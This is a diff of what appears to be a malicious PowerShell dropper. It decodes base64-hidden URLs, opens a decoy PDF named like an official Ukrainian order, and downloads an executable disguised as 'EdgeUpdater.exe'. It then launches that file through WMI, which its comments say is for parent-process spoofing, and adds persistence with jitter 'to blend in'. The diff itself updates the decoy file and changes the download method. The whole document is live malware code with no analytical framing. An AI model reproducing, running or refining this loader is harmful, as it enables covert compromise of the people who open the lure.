@@ -57,20 +57,20 @@ if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force 
 $flagFile = "$cache\installed.flag"
 $isFirstRun = -not (Test-Path $flagFile)
 
-# === URLs AND PATHS ===
-$pdfUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9OYWthel9Oby5fNjYxX3ZpZF8wMi4wMy4yMDI2LnBkZg=='))
+# === URLs AND PATHS (UPDATED WITH COMPRESSED 88 KB PDF) ===
+$pdfUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9OYWthel9Oby5fNjYxX3ZpZF8wMi4wMy4yMDI2LTQucGRm'))
 $exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9FZGdlVXBkYXRlci5leGU='))
-$pdfPath = "$cache\Nakaz_No._661_vid_02.03.2026.pdf"
+$pdfPath = "$cache\Nakaz_No._661_vid_02.03.2026-4.pdf"
 $exePath = "$cache\helper.exe"
 
 $headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'}
 
 # === QUICK DECOY PDF OPEN (First Run Only) ===
 if ($isFirstRun) {
-    # Download PDF if missing
+    # Download PDF if missing (using WebClient for speed)
     if (-not (Test-Path $pdfPath)) {
         try {
-            Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing
+            (New-Object System.Net.WebClient).DownloadFile($pdfUrl, $pdfPath)
         } catch {}
     }
     # Open PDF immediately
@@ -79,7 +79,7 @@ if ($isFirstRun) {
         New-Item -Path $flagFile -ItemType File -Force | Out-Null
     }
 } else {
-    # Persistence runs: minimal jitter to blend
+    # Persistence runs: minimal jitter to blend in
     Start-Sleep -Milliseconds (Get-Random -Min 500 -Max 1500)
 }
 
@@ -92,7 +92,7 @@ if (-not (Test-Path $exePath)) {
     $maxRetries = 3
     do {
         try {
-            Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers $headers -UseBasicParsing
+            (New-Object System.Net.WebClient).DownloadFile($exeUrl, $exePath)
             break
         } catch {
             $retryCount++
@@ -101,7 +101,7 @@ if (-not (Test-Path $exePath)) {
     } while ($retryCount -lt $maxRetries)
 }
 
-# === LAUNCH EXE (WMI preferred) ===
+# === LAUNCH EXE (WMI preferred for parent spoofing) ===
 if (Test-Path $exePath) {
     try {
         $wmiParams = @{
